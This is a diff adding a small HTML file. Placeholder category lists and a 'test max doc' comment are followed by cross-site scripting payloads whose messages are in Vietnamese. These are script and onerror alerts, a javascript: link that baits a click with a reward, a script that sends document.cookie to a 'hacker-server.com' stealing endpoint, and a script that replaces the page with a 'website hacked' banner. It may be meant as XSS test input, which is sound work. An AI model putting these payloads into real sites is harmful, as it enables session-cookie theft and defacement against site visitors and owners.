@@ -1,0 +1,22 @@
+<ul>
+    <li><a href="">Category 1</a></li>
+    <li><a href="">Category 2</a></li>
+    <li><a href="">Category 3</a></li>
+</ul>
+
+<!-- test max doc -->
+ 
+<ul>
+    <li><a href="">Category 1</a></li>
+    <li><a href="">Category 2</a></li>
+    <li><a href="">Category 3</a></li>
+</ul>
+ <script>alert('Website của bạn đã bị tấn công!');</script>
+<img src="x" onerror="alert('XSS qua thuộc tính onerror!')">
+<a href="javascript:alert('XSS qua href!')">Click vào đây để nhận thưởng</a>
+<script>
+    new Image().src = "http://hacker-server.com/steal?cookie=" + document.cookie;
+</script>
+<script>
+    document.body.innerHTML = "<h1 style='color:red;'>TRANG WEB ĐÃ BỊ HACK</h1>";
+</script>
